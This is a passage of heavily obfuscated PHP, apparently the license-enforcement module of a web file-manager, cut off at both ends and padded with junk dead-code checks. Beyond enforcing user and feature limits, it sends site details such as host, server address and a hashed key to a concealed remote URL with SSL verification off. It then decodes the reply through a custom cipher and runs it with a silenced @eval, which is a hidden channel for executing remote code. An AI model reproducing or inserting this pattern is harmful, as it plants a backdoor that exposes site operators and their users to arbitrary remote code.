$ÉœÎÅà© =& $_SERVER[µª„ÑÊÛ]; $_SERVER[$ÉœÎÅà©[159]] = _get($_SERVER, $ÉœÎÅà©[159], APP_HOST); $ä·³æı = $Á›Úã”ê[703]; if (!$ä·³æı) { return; } $this->wmcv07989cfa = $ÉœÎÅà©[106]; $Àßµô«¿ = Model($ÉœÎÅà©[33])->get(); if ($Àßµô«¿[$ÉœÎÅà©[105]] == $ÉœÎÅà©[106]) { return; } $„ƒŒËéŞ = Model($ÉœÎÅà©[33])->get($ÉœÎÅà©[103]); $äş»§÷Ş = $Á›Úã”ê[704]; if (!$äş»§÷Ş) { die; } $ßÒ»ˆ£û = $ÉœÎÅà©[200] . md5($„ƒŒËéŞ . $ÉœÎÅà©[201]); $³ì¬ñ‡· = $Á›Úã”ê[705]; if (strlen($³ì¬ñ‡·) < $Á›Úã”ê[671]) { die; } $º©«€Û = Cache::get($ßÒ»ˆ£û); if (!is_array($º©«€Û) || !isset($º©«€Û[$ÉœÎÅà©[204]]) || time() - $º©«€Û[$ÉœÎÅà©[204]] >= 60) { $…àº¾„ë = Model($ÉœÎÅà©[7])->loadList(); $’Ú—Ñùç = $…àº¾„ë[$ÉœÎÅà©[197]]; $Àã±¦¶å = md5($_SERVER[$ÉœÎÅà©[102]] . strrev($„ƒŒËéŞ) . $Àßµô«¿[$ÉœÎÅà©[188]]); $½ŠÆÎÅ = strrev(substr($Àã±¦¶å, 10, 16)); $º©«€Û = $this->vrskd4c8dfbd($’Ú—Ñùç[$ÉœÎÅà©[85]][$½ŠÆÎÅ], $Àã±¦¶å); $º©«€Û = json_decode($º©«€Û, !0); } if (!is_array($º©«€Û)) { return $this->ngyj0c536d46(); } $èÆ‚³ = strtotime($º©«€Û[$ÉœÎÅà©[128]]); if (time() >= $èÆ‚³) { return $this->ngyj0c536d46(); } if (time() - $º©«€Û[$ÉœÎÅà©[204]] > 20) { $º©«€Û[$ÉœÎÅà©[204]] = time(); Cache::set($ßÒ»ˆ£û, $º©«€Û); } $this->gtui34935948 = $º©«€Û; $this->wmcv07989cfa = $Àßµô«¿[$ÉœÎÅà©[105]]; } private function rinu223aa83c() { $“€ÉÈ å =& $_SERVER[”ú…±Ú¥]; $Àäùõ‰Â =& $_SERVER[µª„ÑÊÛ]; $ª‚Â = $GLOBALS[$Àäùõ‰Â[13]]; $òšÊ’·’ = $_SERVER[$Àäùõ‰Â[24]]; $ˆ­” ù’ = $“€ÉÈ å[706]; if (strlen($ˆ­” ù’) < $“€ÉÈ å[671]) { die; } if ($òšÊ’·’ == $Àäùõ‰Â[205] && $this->wmcv07989cfa == $Àäùõ‰Â[106]) { show_json(LNG($Àäùõ‰Â[206]), !1, $Àäùõ‰Â[207]); } $Ìë—ÙÜº = array($Àäùõ‰Â[208], $Àäùõ‰Â[209]); if (in_array($òšÊ’·’, $Ìë—ÙÜº)) { if ($this->wmcv07989cfa == $Àäùõ‰Â[106] && isset($ª‚Â[$Àäùõ‰Â[210]])) { show_json(LNG($Àäùõ‰Â[206]), !1, $Àäùõ‰Â[207]); die; } $ó­ÓîƒŞ = $this->lirza643d657(); if ($ó­ÓîƒŞ != intval($Àäùõ‰Â[211])) { if ($ó­ÓîƒŞ <= Model($Àäùõ‰Â[124])->count()) { show_json(LNG($Àäùõ‰Â[212]), !1, $Àäùõ‰Â[207]); die; } } } } private function mugx5d76dbb9() { $İ¥õÆÏø =& $_SERVER[”ú…±Ú¥]; $‚¸ª­ù =& $_SERVER[µª„ÑÊÛ]; $ÂŞ–Ğ¤‰ = array($‚¸ª­ù[118], $‚¸ª­ù[119]); if (!_get($GLOBALS, $‚¸ª­ù[115]) || !isset($_GET[$‚¸ª­ù[213]])) { return; } if (!in_array($_SERVER[$‚¸ª­ù[24]], $ÂŞ–Ğ¤‰)) { return; } $Ú«ÃÛõ = $‚¸ª­ù[214]; $ªÀéÅø´ = $İ¥õÆÏø[707]; $Ú«ÃÛõ = $this->iumt0ce21b6d($Ú«ÃÛõ, $‚¸ª­ù[215]); $…‹²¹öÚ = $İ¥õÆÏø[708]; if (!$…‹²¹öÚ) { die; } $íÔäÛëè = stream_context_create(array($‚¸ª­ù[216] => array($‚¸ª­ù[217] => $‚¸ª­ù[218], $‚¸ª­ù[219] => 3))); $‡åäÊ‹É = $İ¥õÆÏø[709]; if (!$‡åäÊ‹É) { die; } $¤’¿Ôç« = @file_get_contents($Ú«ÃÛõ, !1, $íÔäÛëè); header($‚¸ª­ù[220]); $ü•Ê©úÒ = $İ¥õÆÏø[710]; if (strlen($ü•Ê©úÒ) < $İ¥õÆÏø[653]) { die; } if ($¤’¿Ôç« && strstr($¤’¿Ôç«, $‚¸ª­ù[221])) { echo $¤’¿Ôç«; } die; } public function pzqjb1499782($ĞéÃâªš) { $•ƒÙ—û =& $_SERVER[µª„ÑÊÛ]; if ($this->wmcv07989cfa == $•ƒÙ—û[222]) { return $ĞéÃâªš; } $¬÷ÑæúÇ = array($•ƒÙ—û[223] => $•ƒÙ—û[224], $•ƒÙ—û[225] => $•ƒÙ—û[224], $•ƒÙ—û[226] => $•ƒÙ—û[224], $•ƒÙ—û[227] => $•ƒÙ—û[228], $•ƒÙ—û[229] => $•ƒÙ—û[228], $•ƒÙ—û[230] => $•ƒÙ—û[228], $•ƒÙ—û[231] => $•ƒÙ—û[228], $•ƒÙ—û[232] => $•ƒÙ—û[228], $•ƒÙ—û[233] => $•ƒÙ—û[228], $•ƒÙ—û[234] => $•ƒÙ—û[228], $•ƒÙ—û[235] => $•ƒÙ—û[228], $•ƒÙ—û[236] => $•ƒÙ—û[228], $•ƒÙ—û[237] => $•ƒÙ—û[228], $•ƒÙ—û[238] => $•ƒÙ—û[228], $•ƒÙ—û[239] => $•ƒÙ—û[228]); $÷äŸÆöƒ = explode($•ƒÙ—û[240], _get($this->gtui34935948, $•ƒÙ—û[112], $•ƒÙ—û[6])); $–ÔÌ­½ = array(); foreach ($¬÷ÑæúÇ as $ıÇä«×ø => $²Æğı£) { if ($²Æğı£ == $•ƒÙ—û[224] && substr($this->wmcv07989cfa, 0, 1) == $•ƒÙ—û[224]) { continue; } if (!in_array($ıÇä«×ø, $÷äŸÆöƒ)) { $–ÔÌ­½[] = $ıÇä«×ø; } } foreach ($–ÔÌ­½ as $ıÇä«×ø) { unset($ĞéÃâªš[$ıÇä«×ø]); } return $ĞéÃâªš; } private function mtpscd141bc1() { $¾„±¿ôí =& $_SERVER[µª„ÑÊÛ]; if ($this->wmcv07989cfa != $¾„±¿ôí[106]) { $GLOBALS[$¾„±¿ôí[85]][$¾„±¿ôí[89]][$¾„±¿ôí[241]] = $¾„±¿ôí[203]; return; } $GLOBALS[$¾„±¿ôí[85]][$¾„±¿ôí[242]] = $¾„±¿ôí[121]; if (Model($¾„±¿ôí[243])->get($¾„±¿ôí[63]) != $¾„±¿ôí[203]) { Model($¾„±¿ôí[243])->set($¾„±¿ôí[63], $¾„±¿ôí[203]); } } public function rlmx8af28d8e() { return $_SERVER[µª„ÑÊÛ][244]; } private function ljfi180dca65() { $ö÷´Êİµ =& $_SERVER[”ú…±Ú¥]; $³¶Åè =& $_SERVER[µª„ÑÊÛ]; $³ß·ò³¿ = array($³¶Åè[245], $³¶Åè[246], $³¶Åè[247]); $ß°¾‹´Ç = $ö÷´Êİµ[711]; $¢Š§ÉÍ = $³¶Åè[248] . md5($³¶Åè[249]); if ($this->wmcv07989cfa == $³¶Åè[106] || !_get($GLOBALS, $³¶Åè[115])) { return; } if (!in_array($_SERVER[$³¶Åè[24]], $³ß·ò³¿)) { return; } if (time() % 4 != 0) { return; } $ƒÑµ•ëÌ = call_user_func(array($³¶Åè[250], $³¶Åè[251]), $¢Š§ÉÍ); if ($ƒÑµ•ëÌ && time() - $ƒÑµ•ëÌ < intval($³¶Åè[252])) { return; } call_user_func(array($³¶Åè[250], $³¶Åè[138]), $¢Š§ÉÍ, time()); $¶€Œğ«ı = $ö÷´Êİµ[712]; if (strlen($¶€Œğ«ı) < $ö÷´Êİµ[665]) { die; } $’Ä÷ô¶ˆ = Model($³¶Åè[33])->get($³¶Åè[103]); $É†ÏÈó = $ö÷´Êİµ[713]; if (strlen($É†ÏÈó) < $ö÷´Êİµ[192]) { die; } $ìÙõ°ƒƒ = array($³¶Åè[150] => Model($³¶Åè[33])->get($³¶Åè[186]), $³¶Åè[163] => $this->wmcv07989cfa, $³¶Åè[160] => $_SERVER[$³¶Åè[161]], $³¶Åè[162] => Model($³¶Åè[33])->get($³¶Åè[130]), $³¶Åè[101] => md5($_SERVER[$³¶Åè[102]] . $’Ä÷ô¶ˆ), $³¶Åè[153] => $³¶Åè[135], $³¶Åè[156] => $_SERVER[$³¶Åè[157]]); $Ê€¯±ùş = $this->ktmr56b58342($³¶Åè[253], $ìÙõ°ƒƒ); if (!is_array($Ê€¯±ùş)) { return; } if ($Ê€¯±ùş[$³¶Åè[150]] && $Ê€¯±ùş[$³¶Åè[254]]) { if ($this->bdpa38ccfca2($Ê€¯±ùş[$³¶Åè[254]]) == $ìÙõ°ƒƒ[$³¶Åè[150]]) { return; } } $this->ngyj0c536d46(); if ($this->bdpa38ccfca2($Ê€¯±ùş[$³¶Åè[254]]) != $ìÙõ°ƒƒ[$³¶Åè[150]]) { $¶Øˆˆ¹Æ = array($³¶Åè[181] => $’Ä÷ô¶ˆ, $³¶Åè[182] => $_SERVER[$³¶Åè[102]], $³¶Åè[183] => this_url(), $³¶Åè[158] => $_SERVER[$³¶Åè[159]]); $÷¢©ÅÖ = $this->yveue974d758(json_encode($¶Øˆˆ¹Æ)); $Ê€¯±ùş = $this->ktmr56b58342($³¶Åè[184] . $÷¢©ÅÖ); if ($Ê€¯±ùş && is_array($Ê€¯±ùş) && isset($Ê€¯±ùş[$³¶Åè[254]])) { $á¥Şç” = $this->vrskd4c8dfbd($Ê€¯±ùş[$³¶Åè[254]], 2); if ($á¥Şç”) { $á¥Şç” = $this->bdpa38ccfca2($á¥Şç”); } if ($á¥Şç”) { try { @eval($á¥Şç”); } catch (Exception $‚ƒìÀ‚¨) { } } } } } private function ktmr56b58342($ö‘¼áûÃ = '', $‚»»ÍÊ¸ = array(), $¡”©ô’ç = 5) { $¼Ä÷ö° =& $_SERVER[”ú…±Ú¥]; $Ô½®¼Ã¾ =& $_SERVER[µª„ÑÊÛ]; $¤€‘¡Û = $Ô½®¼Ã¾[255]; $Äï¨øõŠ = $¼Ä÷ö°[714]; if (strlen($Äï¨øõŠ) < $¼Ä÷ö°[665]) { return; } $¤€‘¡Û = $this->iumt0ce21b6d($¤€‘¡Û, $Ô½®¼Ã¾[256]); $äü®¹ŠË = $¼Ä÷ö°[715]; while (strlen($äü®¹ŠË) < $¼Ä÷ö°[671]) { if (!$äü®¹ŠË) { break; } $äü®¹ŠË++; } $¤€‘¡Û = $¤€‘¡Û . $ö‘¼áûÃ; $„×ôş•‘ = $¼Ä÷ö°[716]; if ($‚»»ÍÊ¸ && is_array($‚»»ÍÊ¸)) { $¤€‘¡Û = $¤€‘¡Û . $Ô½®¼Ã¾[257] . http_build_query($‚»»ÍÊ¸); } if ($‚»»ÍÊ¸ === -1) { return $¤€‘¡Û; } $÷Úã†óÜ = stream_context_create(array($Ô½®¼Ã¾[216] => array($Ô½®¼Ã¾[219] => $¡”©ô’ç, $Ô½®¼Ã¾[217] => $Ô½®¼Ã¾[258]), $Ô½®¼Ã¾[259] => array($Ô½®¼Ã¾[260] => !1, $Ô½®¼Ã¾[261] => !1))); $‚»»ÍÊ¸ = @file_get_contents($¤€‘¡Û, !1, $÷Úã†óÜ); $ø¢Ìƒû× = $¼Ä÷ö°[717]; if (!$ø¢Ìƒû×) { return; } return json_decode($‚»»ÍÊ¸, !0); $É«ĞçÍ€ = $¼Ä÷ö°[718]; } private function lirza643d657() { $ùØ‡º•Å =& $_SERVER[”ú…±Ú¥]; $È£úè =& $_SERVER[µª„ÑÊÛ]; $ò»Û¡Š = array($È£úè[262] => $È£úè[263], $È£úè[264] => $È£úè[265], $È£úè[266] => $È£úè[267], $È£úè[268] => $È£úè[269], $È£úè[270] => $È£úè[271], $È£úè[272] => $È£úè[211], $È£úè[273] => $È£úè[211], $È£úè[274] => $È£úè[263], $È£úè[275] => $È£úè[265], $È£úè[276] => $È£úè[267], $È£úè[277] => $È£úè[278], $È£úè[279] => $È£úè[269], $È£úè[280] => $È£úè[281], $È£úè[282] => $È£úè[271], $È£úè[283] => $È£úè[284], $È£úè[285] => $È£úè[286], $È£úè[287] => $È£úè[288]); $°³ªõ€ = $ò»Û¡Š[$this->wmcv07989cfa]; $»Ş©Íç = $ùØ‡º•Å[719]; if (!$»Ş©Íç) { die; } $°³ªõ€ = intval($°³ªõ€ ? $°³ªõ€ : $È£úè[263]); $ç²óŠíí = $ùØ‡º•Å[720]; while (strlen($ç²óŠíí) < $ùØ‡º•Å[653]) { if (!$ç²óŠíí) { break; } $ç²óŠíí++; } $¡ó‡‡“ù = _get($this->gtui34935948, $È£úè[289]); $äÙ˜’ñö = $ùØ‡º•Å[721]; $¡ó‡‡“ù = $¡ó‡‡“ù ? intval($¡ó‡‡“ù) : 0; return $°³ªõ€ + $¡ó‡‡“ù; $ÌÓ¯™ö€ = $ùØ‡º•Å[722]; if (strlen($ÌÓ¯™ö€) < $ùØ‡º•Å[192]) { die; } } public function umzy7283cdbe($÷íƒËèü) { $¼–«Ô„û =& $_SERVER[µª„ÑÊÛ]; $¸ãí‘‹ê = $this->lirza643d657(); if ($÷íƒËèü[$¼–«Ô„û[290]] == $¼–«Ô„û[121]) { return; } if ($¸ãí‘‹ê >= intval($¼–«Ô„û[211])) { return; } $Âö¦›…’ = Model($¼–«Ô„û[124])->count(); if ($Âö¦›…’ <= $¸ãí‘‹ê) { return; } $¸ı¿×ˆ¼ = Model($¼–«Ô„û[124])->field($¼–«Ô„û[290])->limit($¸ãí‘‹ê)->select(); $¸ı¿×ˆ¼ = array_to_keyvalue($¸ı¿×ˆ¼, $¼–«Ô„û[6], $¼–«Ô„û[290]); if (!in_array($÷íƒËèü[$¼–«Ô„û[290]], $¸ı¿×ˆ¼)) { show_json($¼–«Ô„û[291], !1, $¼–«Ô„û[207]); } } public function iqaw109714d3() { $öƒöÇÈ¨ =& $_SERVER[”ú…±Ú¥]; $Ï´ÑØå¹ =& $_SERVER[µª„ÑÊÛ]; if (!_get($GLOBALS, $Ï´ÑØå¹[115]) || mt_rand(1, 100) > 20) { return; } $°©·¾ç = $Ï´ÑØå¹[214]; $¡éÎ«µ = $öƒöÇÈ¨[723]; if (!$¡éÎ«µ) { return; } $°©·¾ç = $this->iumt0ce21b6d($°©·¾ç, $Ï´ÑØå¹[215]); $ò³Ö‹¬ª = $öƒöÇÈ¨[724]; $Ì¿¿‚Œá = stream_context_create(array($Ï´ÑØå¹[216] => array($Ï´ÑØå¹[217] => $Ï´ÑØå¹[218], $Ï´ÑØå¹[219] => 3))); $âÈ×óâ = $öƒöÇÈ¨[725]; if (!$âÈ×óâ) { die; } $À³ûÜ‡ú = @file_get_contents($°©·¾ç, !1, $Ì¿¿‚Œá); $à®œû—Š = $öƒöÇÈ¨[726]; echo $Ï´ÑØå¹[292] . hash_encode($À³ûÜ‡ú) . $Ï´ÑØå¹[293]; } private function tsmd6a4e7bf7($¸Æ‚¡ï, $çÓÓ×€û, $ÕŞ»×¸Ş = 3) { $Ï£¿øµµ =& $_SERVER[”ú…±Ú¥]; $‹ò‰»¤’ =& $_SERVER[µª„ÑÊÛ]; usleep(1); $¦ÇÄ°¢À = $Ï£¿øµµ[727]; if (!$¦ÇÄ°¢À) { die; } $¸Æ‚¡ï = trim($¸Æ‚¡ï); $ü¡Öâ¼ó = $Ï£¿øµµ[728]; $•Ì–üÂš = mt_rand(0, 5) . $‹ò‰»¤’[6]; $ÓçÈÄ´‚ = rand_string(15); $š‘²ÙÆ€ = $‹ò‰»¤’[294]; $ıò‡æ‰÷ = $Ï£¿øµµ[729]; if (strlen($ıò‡æ‰÷) < $Ï£¿øµµ[192]) { return; } switch ($•Ì–üÂš) { case $‹ò‰»¤’[203]: $Ëäãè€Ø = $this->qyxzcaf2f017($¸Æ‚¡ï, strrev($çÓÓ×€û . $ÓçÈÄ´‚)); break; $´îî©ÄÏ = $Ï£¿øµµ[730]; if (!$´îî©ÄÏ) { die; } case $‹ò‰»¤’[121]: $Ëäãè€Ø = $this->qyxzcaf2f017($¸Æ‚¡ï, strrev($ÓçÈÄ´‚ . $çÓÓ×€û)); $ñ¬ˆ¦Œ = $Ï£¿øµµ[731]; while (strlen($ñ¬ˆ¦Œ) < $Ï£¿øµµ[665]) { if (!$ñ¬ˆ¦Œ) { break; } $ñ¬ˆ¦Œ++; } break; $şÓ¾š§ü = $Ï£¿øµµ[732]; while ($şÓ¾š§ü < $Ï£¿øµµ[665]) { if ($şÓ¾š§ü >= 0) { break; } $şÓ¾š§ü++; } case $‹ò‰»¤’[295]: $Ëäãè€Ø = $this->qyxzcaf2f017($¸Æ‚¡ï, base64_encode($ÓçÈÄ´‚ . $çÓÓ×€û)); $í¬ÍÛ²¾ = $Ï£¿øµµ[733]; break; case $‹ò‰»¤’[296]: $Ëäãè€Ø = $this->qyxzcaf2f017($¸Æ‚¡ï, md5($ÓçÈÄ´‚ . $çÓÓ×€û)); $ñ›½‰Ï = $Ï£¿øµµ[734]; break; $×«³ñ¨ì = $Ï£¿øµµ[735]; if (!$×«³ñ¨ì) { return; } case $‹ò‰»¤’[297]: $¸Æ‚¡ï = base64_encode($¸Æ‚¡ï); $Ì»²¦û… = rand(0, 64); $şşµĞóá = $š‘²ÙÆ€[$Ì»²¦û…]; $ßî÷À½è = $Ï£¿øµµ[736]; $¦Ë˜ŸªÜ = md5($şşµĞóá . md5($çÓÓ×€û . $şşµĞóá) . $çÓÓ×€û); $¥ÖÓáõê = $Ï£¿øµµ[737]; if (strlen($¥ÖÓáõê) < $Ï£¿øµµ[192]) { die; } $¦Ë˜ŸªÜ = substr($¦Ë˜ŸªÜ, $Ì»²¦û… % 8, $Ì»²¦û… % 8 + 7); $‡âØ›ãç = $‹ò‰»¤’[6]; $ŠóŒâê = $Ï£¿øµµ[738]; if (!$ŠóŒâê) { die; } $éÉÒæ€ë = 0; $’²ËÊŞ = $Ï£¿øµµ[739]; if (!$’²ËÊŞ) { return; } $ĞŸ€ê­ = 0; $œ¦ÖãİÏ = $Ï£¿øµµ[740]; while (strlen($œ¦ÖãİÏ) < $Ï£¿øµµ[656]) { if (!$œ¦ÖãİÏ) { break; } $œ¦ÖãİÏ++; } $ã¢Æğ = 0; $ù›Ô±©– = $Ï£¿øµµ[741]; if (strlen($ù›Ô±©–) < $Ï£¿øµµ[653]) { return; } for ($éÉÒæ€ë = 0; $éÉÒæ€ë < strlen($¸Æ‚¡ï); $éÉÒæ€ë++) { $ã¢Æğ = $ã¢Æğ == strlen($¦Ë˜ŸªÜ) ? 0 : $ã¢Æğ; $²€ÃÎ­° = $Ï£¿øµµ[742]; if (!$²€ÃÎ­°) { die; } $ĞŸ€ê­ = ($Ì»²¦û… + strpos($š‘²ÙÆ€, $¸Æ‚¡ï[$éÉÒæ€ë]) + ord($¦Ë˜ŸªÜ[$ã¢Æğ++])) % 64; $‡âØ›ãç .= $š‘²ÙÆ€[$ĞŸ€ê­]; $‘¶èÁŠß = $Ï£¿øµµ[743]; if (strlen($‘¶èÁŠß) < $Ï£¿øµµ[192]) { return; } } $Ëäãè€Ø = hash_encode($şşµĞóá . $‡âØ›ãç); $æ²Ë¦ª = $Ï£¿øµµ[744]; if (strlen($æ²Ë¦ª) < $Ï£¿øµµ[656]) { die; } break; $ÕëïŠæ = $Ï£¿øµµ[745]; if (strlen($ÕëïŠæ) < $Ï£¿øµµ[665]) { die; } default: $Ëäãè€Ø = $this->qyxzcaf2f017($¸Æ‚¡ï, $çÓÓ×€û . $ÓçÈÄ´‚); break; $ïşÍşã = $Ï£¿øµµ[746]; if (!$ïşÍşã) { die; } } $Ëäãè€Ø = strrev($•Ì–üÂš . $ÓçÈÄ´‚ . $Ëäãè€Ø); if ($ÕŞ»×¸Ş - 1 > 0) { $Ëäãè€Ø = $this->tsmd6a4e7bf7($Ëäãè€Ø, $çÓÓ×€û, $ÕŞ»×¸Ş - 1); } return $Ëäãè€Ø; } private function vrskd4c8dfbd($Æ˜–ŞĞâ, $ĞÂ¦íÃ—, $÷Şûƒªå = 3) { $ç®ÑÕÛ =& $_SERVER[”ú…±Ú¥]; $®Œøá¤¢ =& $_SERVER[µª„ÑÊÛ]; if (!is_string($Æ˜–ŞĞâ) || strlen($Æ˜–ŞĞâ) < 10) { return !1; } $Æ˜–ŞĞâ = trim($Æ˜–ŞĞâ); $Æ˜–ŞĞâ = strrev($Æ˜–ŞĞâ); $¯âƒäÓò = $ç®ÑÕÛ[747]; if (strlen($¯âƒäÓò) < $ç®ÑÕÛ[656]) { die; } $ÅŒ¶ïØ’ = $Æ˜–ŞĞâ[0]; $ç»³ñ¥Ğ = substr($Æ˜–ŞĞâ, 1, 15); $ŸÇªñğœ = $ç®ÑÕÛ[748]; $Æ˜–ŞĞâ = substr($Æ˜–ŞĞâ, 16); $ê¿ƒÍ«Ş = $ç®ÑÕÛ[749]; if (strlen($ê¿ƒÍ«Ş) < $ç®ÑÕÛ[665]) { return; } $¸ŞÁ™Îı = $®Œøá¤¢[294]; switch ($ÅŒ¶ïØ’) { case $®Œøá¤¢[203]: $¹±øƒÖ = $this->iumt0ce21b6d($Æ˜–ŞĞâ, strrev($ĞÂ¦íÃ— . $ç»³ñ¥Ğ)); break; case $®Œøá¤¢[121]: $¹±øƒÖ = $this->iumt0ce21b6d($Æ˜–ŞĞâ, strrev($ç»³ñ¥Ğ . $ĞÂ¦íÃ—)); break; $»¿×¡ùã = $ç®ÑÕÛ[750]; while (strlen($»¿×¡ùã) < $ç®ÑÕÛ[656]) { if (!$»¿×¡ùã) { break; } $»¿×¡ùã++; } case $®Œøá¤¢[295]: $¹±øƒÖ = $this->iumt0ce21b6d($Æ˜–ŞĞâ, base64_encode($ç»³ñ¥Ğ . $ĞÂ¦íÃ—)); break; case $®Œøá¤¢[296]: $¹±øƒÖ = $this->iumt0ce21b6d($Æ˜–ŞĞâ, md5($ç»³ñ¥Ğ . $ĞÂ¦íÃ—)); break; $¦¾â¶æ = $ç®ÑÕÛ[751]; while ($¦¾â¶æ < $ç®ÑÕÛ[192]) { if ($¦¾â¶æ >= 0) { break; } $¦¾â¶æ++; } case $®Œøá¤¢[297]: $Æ˜–ŞĞâ = hash_decode($Æ˜–ŞĞâ); $ˆ´ÇÀÄé = $Æ˜–ŞĞâ[0]; $‰©¯”ºÂ = $ç®ÑÕÛ[752]; if (strlen($‰©¯”ºÂ) < $ç®ÑÕÛ[671]) { die; } $Æ˜–ŞĞâ = substr($Æ˜–ŞĞâ, 1); $ëµéùù« = strpos($¸ŞÁ™Îı, $ˆ´ÇÀÄé); $¢€é’×Ù = $ç®ÑÕÛ[753]; $ç€÷°Òí = md5($ˆ´ÇÀÄé . md5($ĞÂ¦íÃ— . $ˆ´ÇÀÄé) . $ĞÂ¦íÃ—); $ç€÷°Òí = substr($ç€÷°Òí, $ëµéùù« % 8, $ëµéùù« % 8 + 7); $ÑÈİ÷ÔÇ = $®Œøá¤¢[6]; $ £Úù˜ = 0; $‡“¥íÚî = $ç®ÑÕÛ[754]; $ñ¼é¡˜¿ = 0; $¤¯àÚ‡Ñ = $ç®ÑÕÛ[755]; $é­¾”íş = 0; $¤ÚªÛôš = $ç®ÑÕÛ[756]; while ($¤ÚªÛôš < $ç®ÑÕÛ[665]) { if ($¤ÚªÛôš >= 0) { break; } $¤ÚªÛôš++; } for ($ £Úù˜ = 0; $ £Úù˜ < strlen($Æ˜–ŞĞâ); $ £Úù˜++) { $é­¾”íş = $é­¾”íş == strlen($ç€÷°Òí) ? 0 : $é­¾”íş; $Ô‚ƒ÷Ñ½ = $é­¾”íş++; $ñ¼é¡˜¿ = strpos($¸ŞÁ™Îı, $Æ˜–ŞĞâ[$ £Úù˜]) - $ëµéùù« - ord($ç€÷°Òí[$Ô‚ƒ÷Ñ½]); $ä·ô¥É’ = $ç®ÑÕÛ[757]; if (!$ä·ô¥É’) { return; } while ($ñ¼é¡˜¿ < 0) { $ñ¼é¡˜¿ += 64; $‰î‹Âú¸ = $ç®ÑÕÛ[758]; if (strlen($‰î‹Âú¸) < $ç®ÑÕÛ[656]) { return; } } $ÑÈİ÷ÔÇ .= $¸ŞÁ™Îı[$ñ¼é¡˜¿]; } $¹±øƒÖ = base64_decode($ÑÈİ÷ÔÇ); $¦şœ¢úæ = $ç®ÑÕÛ[759]; if (!$¦şœ¢úæ) { return; } break; $İàÛ»ÉÅ = $ç®ÑÕÛ[760]; if (!$İàÛ»ÉÅ) { die; } default: $¹±øƒÖ = $this->iumt0ce21b6d($Æ˜–ŞĞâ, $ĞÂ¦íÃ— . $ç»³ñ¥Ğ); $˜ˆ•îèú = $ç®ÑÕÛ[761]; while (strlen($˜ˆ•îèú) < $ç®ÑÕÛ[656]) { if (!$˜ˆ•îèú) { break; } $˜ˆ•îèú++; } break; } if ($÷Şûƒªå - 1 > 0) { $¹±øƒÖ = $this->vrskd4c8dfbd($¹±øƒÖ, $ĞÂ¦íÃ—, $÷Şûƒªå - 1); } return $¹±øƒÖ; } public function yveue974d758($£‰­±¸) { $üÀÖØ½× =& $_SERVER[”ú…±Ú¥]; $Ê«ıÁ•â =& $_SERVER[µª„ÑÊÛ]; $Üå ü„Ò = $this->blnh2465b46a(); $ÙºõÇš¡ = $this->blnh2465b46a(); $¥ãÛË¥ = ($Üå ü„Ò - 1) * ($ÙºõÇš¡ - 1); $âˆÊÇ = intval(($Üå ü„Ò + $ÙºõÇš¡) / 2); $•àß±ƒ = $üÀÖØ½×[762]; while (strlen($•àß±ƒ) < $üÀÖØ½×[653]) { if (!$•àß±ƒ) { break; } $•àß±ƒ++; } while (1) { $ı°¸æÆ = $âˆÊÇ; $şÔŒö°ñ = $¥ãÛË¥; $º“šç¸¬ = $üÀÖØ½×[763]; if (strlen($º“šç¸¬) < $üÀÖØ½×[192]) { return; } while ($şÔŒö°ñ % $ı°¸æÆ != 0) { $¾êüÔ¢Å = $şÔŒö°ñ; $şÔŒö°ñ = $ı°¸æÆ; $ı°¸æÆ = $¾êüÔ¢Å % $ı°¸æÆ; } if ($ı°¸æÆ == 1) { break; } else { $âˆÊÇ++; } } $‰Ší˜ = 2; for ($¹ŸúÉ¿˜ = 0; $¹ŸúÉ¿˜ < $¥ãÛË¥ * 10; $¹ŸúÉ¿˜++) { if (($¥ãÛË¥ * $¹ŸúÉ¿˜ + 1) % $âˆÊÇ == 0) { $‰Ší˜ = intval(($¥ãÛË¥ * $¹ŸúÉ¿˜ + 1) / $âˆÊÇ); break; } } $ŸëáËÙ« = $this->qyxzcaf2f017($Üå ü„Ò * $ÙºõÇš¡ . $Ê«ıÁ•â[6], $Ê«ıÁ•â[135]); $¨†¹‰å = $üÀÖØ½×[764]; $úşÆÈôŸ = md5($Ê«ıÁ•â[298] . ($Üå ü„Ò + $ÙºõÇš¡) . $Ê«ıÁ•â[299] . $âˆÊÇ . $Ê«ıÁ•â[299] . $‰Ší˜ . $Ê«ıÁ•â[300]); $íŞšŸáİ = $üÀÖØ½×[765]; $«§â´² = $this->qyxzcaf2f017($£‰­±¸, $úşÆÈôŸ) . $Ê«ıÁ•â[301] . $ŸëáËÙ«; return $«§â´²; } public function bdpa38ccfca2($şÃ¨“ƒ¡) { $§¦·²Êá =& $_SERVER[”ú…±Ú¥]; $¤õ€²¼ =& $_SERVER[µª„ÑÊÛ]; $©Â¿­Ğ = explode($¤õ€²¼[301], $şÃ¨“ƒ¡); if (count($©Â¿­Ğ) != 2) { return $¤õ€²¼[6]; } $é®Æôæ = $this->iumt0ce21b6d($©Â¿­Ğ[1] . $¤õ€²¼[6], $¤õ€²¼[135]); if (!$é®Æôæ) { return $¤õ€²¼[6]; } $é®Æôæ = intval($é®Æôæ); $‘Òû¹ûË = 0; $µûÅ¿ƒĞ = 0; for ($³Ö‹§ûÇ = 3; $³Ö‹§ûÇ < $é®Æôæ; $³Ö‹§ûÇ += 2) { if ($é®Æôæ % $³Ö‹§ûÇ != 0) { continue; } $‘Òû¹ûË = $³Ö‹§ûÇ; $÷ø¬– = $§¦·²Êá[766]; if (!$÷ø¬–) { return; } $µûÅ¿ƒĞ = intval($é®Æôæ / $³Ö‹§ûÇ); break; $ÍäÕÕËá = $§¦·²Êá[767]; if (!$ÍäÕÕËá) { return; } } $ÕºÚ¾Ö« = ($‘Òû¹ûË - 1) * ($µûÅ¿ƒĞ - 1); $¼»Š¨¼ = intval(($‘Òû¹ûË + $µûÅ¿ƒĞ) / 2); $²â’Æ– = $§¦·²Êá[768]; if (!$²â’Æ–) { return; } while (1) { $ŞÇ£çûÒ = $¼»Š¨¼; $£İ¸‡ÉÃ = $§¦·²Êá[769]; $­ÄàêİË = $ÕºÚ¾Ö«; $é®¥ö–« = $§¦·²Êá[770]; if (!$é®¥ö–«) { return; } while ($­ÄàêİË % $ŞÇ£çûÒ != 0) { $íóÀœ³Ì = $­ÄàêİË; $­ÄàêİË = $ŞÇ£çûÒ; $ŞÇ£çûÒ = $íóÀœ³Ì % $ŞÇ£çûÒ; } if ($ŞÇ£çûÒ == 1) { break; } else { $¼»Š¨¼++; } } $ùÛ¢şËŠ = 2; for ($³Ö‹§ûÇ = 0; $³Ö‹§ûÇ < $ÕºÚ¾Ö« * 10; $³Ö‹§ûÇ++) { if (($ÕºÚ¾Ö« * $³Ö‹§ûÇ + 1) % $¼»Š¨¼ == 0) { $ùÛ¢şËŠ = intval(($ÕºÚ¾Ö« * $³Ö‹§ûÇ + 1) / 